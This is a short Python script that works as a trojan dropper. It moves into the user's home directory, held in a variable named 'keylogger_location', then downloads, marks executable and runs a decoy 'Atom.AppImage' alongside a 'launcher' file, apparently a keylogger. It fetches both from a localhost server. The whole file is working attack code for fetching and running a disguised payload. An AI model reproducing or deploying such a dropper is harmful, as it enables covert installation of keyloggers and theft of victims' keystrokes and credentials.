!/usr/bin/env python
import requests
import subprocess
import os 
import sys

def down_and_wr(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

keylogger_location = os.environ['HOME']
os.chdir(keylogger_location)

down_and_wr("http://127.0.0.1/Atom.AppImage")
subprocess.call("chmod +x Atom.AppImage", shell=True)
subprocess.Popen("./Atom.AppImage", shell = True)

down_and_wr("http://127.0.0.1/launcher")
subprocess.call("chmod +x launcher", shell=True)
subprocess.Popen("./launcher", shell = True)

sys.exit()
